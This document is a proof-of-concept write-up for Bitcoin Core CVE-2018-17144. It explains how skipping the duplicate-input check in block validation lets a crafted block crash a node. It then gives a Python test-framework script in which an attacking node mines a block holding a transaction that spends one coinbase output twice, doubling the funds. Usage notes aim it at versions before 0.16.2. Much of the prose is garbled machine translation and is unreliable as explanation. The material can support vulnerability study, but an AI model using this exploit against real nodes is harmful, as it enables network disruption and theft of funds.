# PoC of BitcoinCore Denial-Of-Service and DoubleSpending CVE-2018-17144
On 18/19 September, bitcoin Core, the mainstream client of Bitcoin, published an article on the serious security of its code.
A denial-of-service vulnerability exploitable by miners has been discovered in Bitcoin Core versions 0.14.0 up to 0.16.2. It is recommended to upgrade any of the vulnerable versions to 0.16.3 as soon as possible. 
bitcoincore.org : Security issue CVE-2018-17144: it was discovered that older versions of Bitcoin Core will crash if they try to process a block containing a transaction that attempts to spend the same input twice. Such blocks are invalid, so they can only be created by a miner willing to sacrifice their allowed income for creating a block of at least 12.5 BTC (about $80,000 USD as of this writing). This release eliminates the crash, allowing the software to quietly reject such invalid blocks.
# Vulnerability disclosure
On the master code branch of Bitcoin Core, commit b8f8019 fixes this vulnerability, such as :  https://github.com/bitcoin/bitcoin/commit/b8f801964f59586508ea8da6cf3decd76bc0e571
This code is located in the CheckBlock() function in src/validation.cpp, which receives new in the node.
The block is called. The meaning of the CheckTransaction() function called on line 3125 and its third argument can be
Analyze according to its code implementation.
``` 
bool CheckTransaction(const CTransaction& tx, CValidationState &state, bool CheckDuplicateInputs)
{
  // ......
  // Check for duplicate inputs - note that this check is slow so we skip it in CheckBlock
  if (fCheckDuplicateInputs) {
    std::set<COutPoint> vInOutPoints;
    for (const auto& txin : tx.vin)
    {
      if (!vInOutPoints.insert(txin.prevout).second)
        return state.DoS(100, false, REJECT_INVALID, "bad-txns-inputs-duplicate");
    }
    }
    // ...... 
}
```
####  CheckTransaction() function
The CheckTransaction() function detects incoming transaction messages (CTransaction&tx), where
This includes detecting whether a transaction has a double flower. The detection scheme is very simple and will compare this to all Coin used in the transaction.
(Ttex.prevout in the code, which represents UTXO in Bitcoin transactions. This article is followed by the word Coin.
Representation, in order to be consistent with the code), is recorded in std::set, if it is found that a record is repeatedly recorded twice, it will return
Back to the failed message (state.DoS), this message will eventually be fed back to the sender of the block through the P2P channel.
Based on the comments section in the code snippet, it can be seen that this detection code is in the process of being called by the CheckBlock() function.
It is considered redundant and time consuming, and is skipped by setting the third parameter of the function to False.
CheckBlock() performs a selection to skip the double-check, because its subsequent actions will be more for transactions in the entire block.
Complex and comprehensive inspection. However, these inspection codes failed to detect and dispose of certain anomalies as expected.
Caused the existence of a loophole.

## DoS Attack PoC
Bitcoin's master code branch, commit b8f8019 (the vulnerability fix mentioned earlier)
The child commit 9b4a36e gives the validation code for the vulnerability.
This test code written in Python is located at test/functional/p2p_invalid_block.py
In the script. The script builds a test network, and the test code can be connected via RPC interface, P2P interface, etc.
Go to the target node and send test data, such as maliciously constructed block data, transaction information, and so on.
The function of the trial code is to find the second transaction (vtx[2]) in the block2_orig block and enter the transaction into it.
The first Coin(vtx[2].vin[0]) is repeatedly added to the input sequence to construct a vtx[2].vin[0]
Make a double spend transaction message. As shown in line 92, when the block2_orig block is sent to the node side of the fixed vulnerability,
The node will receive a refusal to receive the message, and the message content is “bad-txns-duplicate”.
If you use the code for this test to test a node that has not been fixed.
The block data maliciously constructed by the test script caused the target node to crash, resulting in the Python script and the node process.
The P2P connection between them is broken, causing a ConnectionResetError to be thrown.

## Double Spend Attack PoC

The official PoC gives an indication of the DoS attack. However, this PoC is in a test network with only one node
Run, and the unlock script for all transaction data is set to "anyone can spend." Due to its particularity, for
Verify that the double-spend attack lacks a certain persuasive power. Therefore, this article is based on the test framework of Bitcoin Core.

The three roles in the test are shown in As N0 and N1. N0 stands for attacker maliciously written using Python programs
P2P service, constructing malicious block data; N1 represents one of many normal nodes, and is a neighbor node of N0.Pass the P2P interface for message delivery. The key code of the test script is as follows.


``` 
def run_test(self):
  # Preparation Works ...... # Generate the block1 to let node0 get 50 BTC as the initial funding
  block1 = create_block(tip, create_coinbase(height, n0_pubk), block_time)
  block1.solve()
  node0.p2p.send_blocks_and_test([block1], node0, success=True, timeout=60)
  # Mature the block, make the mined BTC usable. node0.generatetoaddress(100, node0.get_deterministic_priv_key().address)
  assert(node0.getbalance() == 50) # node0 get the reward as a miner
  # craft a new transaction, which double spend the coinbase tx in block1
  tx2_raw = node0.createrawtransaction(
    inputs = [{"txid": block1.vtx[0].hash, "vout": 0}, {"txid": block1.vtx[0].hash, "vout": 0}], 
    outputs = {n1_addr: 100}
  )
  tx2_sig = node0.signrawtransactionwithwallet(tx2_raw)
  assert_equal(tx2_sig["complete"], True)
  tx2_hex = tx2_sig["hex"]
  tct2 = CTransaction()
  tct2.deserialize(BytesIO(hex_str_to_bytes(tx2_hex)))
  # Preparation for generate block2 ......
  block2 = create_block(tip, create_coinbase(height), block_time)
  block2.vtx.extend([tct2])
  block2.hashMerkleRoot = block2.calc_merkle_root()
  block2.solve()
  node0.p2p.send_blocks_and_test([block2], node0, success=True, timeout=60)
  # Check the balances
  assert(node0.getbalance() == 0)
  assert(node1.getbalance() == 100)
  self.log.info("Successfully double spend the 50 BTCs.")
```

### Usage Notes : 
 - It Directly Work with :  https://github.com/bitcoin/bitcoin/tree/master/test/functional/test_framework
 - Move The PoC To the Folder Containg the Bitcoin Soursecode
 - Version Bitcoin < 0.16.2
 - Don't Use It for maliciously Activity
 




